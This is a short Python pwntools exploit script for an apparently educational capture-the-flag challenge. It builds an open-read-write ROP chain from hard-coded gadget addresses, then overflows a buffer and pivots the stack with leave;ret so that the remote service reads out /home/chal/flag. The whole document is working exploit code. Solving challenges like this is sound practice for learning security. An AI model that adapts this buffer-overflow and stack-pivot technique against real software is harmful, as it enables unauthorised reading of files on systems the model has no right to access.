from pwn import *

#r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10005)
raw_input()
context.arch = 'amd64'

fn = 0x4e3340
ROP_addr = 0x4e3360

pop_rax_ret = 0x45db87
pop_rdi_ret = 0x4038b3
pop_rsi_ret = 0x402428
pop_rdx_rbx_ret = 0x493a2b
syscall_ret = 0x4284b6
leave_ret = 0x40190c

ROP = flat(
   # Open filename
   pop_rax_ret, 2,
   pop_rdi_ret, fn,
   pop_rsi_ret, 0,
   syscall_ret,

   # Read the file
   pop_rax_ret, 0,
   pop_rdi_ret, 3,
   pop_rsi_ret, fn,
   pop_rdx_rbx_ret, 0x30, 0,
   syscall_ret,

   # Write the file
   pop_rax_ret, 1,
   pop_rdi_ret, 1,
   syscall_ret,
   )

r.sendafter("Give me filename:", '/home/chal/flag\x00')
r.sendafter("Give me ROP:", b'a'*0x8 + ROP)
r.sendafter('Give me overflow:', b'a'*0x20 + p64(ROP_addr) + p64(leave_ret))

r.interactive()
